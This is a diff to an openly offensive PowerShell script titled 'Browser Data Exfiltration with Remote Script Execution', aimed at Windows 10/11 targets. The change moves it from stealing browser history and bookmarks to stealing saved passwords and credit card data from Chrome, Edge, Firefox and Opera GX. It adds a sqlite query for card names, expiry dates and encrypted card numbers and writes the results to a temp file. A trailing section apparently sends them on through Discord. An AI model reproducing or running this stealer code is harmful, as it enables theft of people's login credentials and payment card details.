@@ -1,6 +1,6 @@
 # Title: Browser Data Exfiltration with Remote Script Execution
 # Author: Jakoby
-# Description: This script extracts browser history, bookmarks, and saved usernames/passwords from IE, Chrome, Firefox, and Opera GX on Windows 10/11 targets.
+# Description: This script extracts saved usernames/passwords and credit card information from Chrome, Firefox, and Opera GX on Windows 10/11 targets.
 
 # Target OS: Windows 10, 11
 
@@ -14,10 +14,10 @@ function Get-BrowserData {
     )
 
     $Path = switch ($Browser) {
-        'chrome'  { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" } }
-        'edge'    { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" } }
-        'firefox' { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" } }
-        'opera'   { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" } }
+        'chrome'  { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" } }
+        'edge'    { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" } }
+        'firefox' { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" } }
+        'opera'   { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" } }
         default { Write-Host 'Unsupported browser or data type specified'; return }
     }
 
@@ -39,18 +39,17 @@ function Get-BrowserData {
         } elseif ($DataType -eq 'passwords' -and $Browser -eq 'firefox') {
             $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
             Write-Output "[Firefox Passwords]: $($firefoxData.logins)"
-        } else {
-            $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-            $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { ($_.Matches).Value } | Sort -Unique
-            $Value | ForEach-Object {
-                $Key = $_
-                New-Object -TypeName PSObject -Property @{
-                    User = $env:UserName
-                    Browser = $Browser
-                    DataType = $DataType
-                    Data = $_
-                }
+        } elseif ($DataType -eq 'creditcards' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
+            $sqliteCommand = "sqlite3.exe"
+            $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
+            if (Test-Path $sqliteCommand) {
+                $creditCardData = & $sqliteCommand $Path $query
+                Write-Output "[$Browser Credit Cards]: $creditCardData"
+            } else {
+                Write-Host 'sqlite3.exe not found. Unable to extract credit card information.'
             }
+        } else {
+            Write-Host "Unsupported data type for $Browser"
         }
     } catch {
         Write-Host "Failed to extract $DataType from $Browser"
@@ -68,17 +67,13 @@ if ([string]::IsNullOrEmpty($dc)) {
 
 # Collect browser data
 $outputFile = "$env:TMP\--BrowserData.txt"
-Get-BrowserData -Browser "edge" -DataType "history" >> $outputFile
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $outputFile
 Get-BrowserData -Browser "edge" -DataType "passwords" >> $outputFile
-Get-BrowserData -Browser "chrome" -DataType "history" >> $outputFile
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $outputFile
+Get-BrowserData -Browser "edge" -DataType "creditcards" >> $outputFile
 Get-BrowserData -Browser "chrome" -DataType "passwords" >> $outputFile
-Get-BrowserData -Browser "firefox" -DataType "history" >> $outputFile
+Get-BrowserData -Browser "chrome" -DataType "creditcards" >> $outputFile
 Get-BrowserData -Browser "firefox" -DataType "passwords" >> $outputFile
-Get-BrowserData -Browser "opera" -DataType "history" >> $outputFile
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $outputFile
 Get-BrowserData -Browser "opera" -DataType "passwords" >> $outputFile
+Get-BrowserData -Browser "opera" -DataType "creditcards" >> $outputFile
 
 # Send completion notification to Discord
 try {
